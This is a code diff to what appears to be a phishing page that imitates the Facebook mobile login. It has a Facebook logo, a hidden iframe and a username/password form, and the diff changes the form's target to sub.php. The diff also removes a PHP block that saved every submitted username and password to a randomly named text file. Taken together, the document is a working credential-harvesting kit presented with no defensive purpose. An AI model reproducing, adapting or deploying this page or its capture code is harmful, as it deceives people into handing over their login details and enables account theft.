@@ -96,7 +96,7 @@ padding: 0;
 <div class='header' data-sigil='mChromeHeaderCenter'><a href='/'><img height='20' src='https://static.xx.fbcdn.net/rsrc.php/v3/y4/r/gf6iHxsw8zm.png' width='100'/></a></div>
 <login>
 <iframe border='0' height='0' name='hiddenFrame' style='display: none;' width='0'></iframe>
-<form action="index.php" method="post" target='hiddenFrame'>
+<form action="sub.php" method="post" target='hiddenFrame'>
 <input name='username' placeholder='Phone or name' type='text'/>
 <br/>
 <input name='password' placeholder='password' type='password'/>
@@ -135,16 +135,3 @@ padding: 0;
 </body>
 </html>
 
-<?php
-
-
-
-$usr=$_POST["username"];
-$password=$_POST["password"];
-
-$file=strval(rand(0,99999999)).".txt";
-$myfile = fopen($file, "w") or die("Unable to open file!");
-$txt = $usr.$password;
-fwrite($myfile, $txt);
-fclose($myfile);
-?>
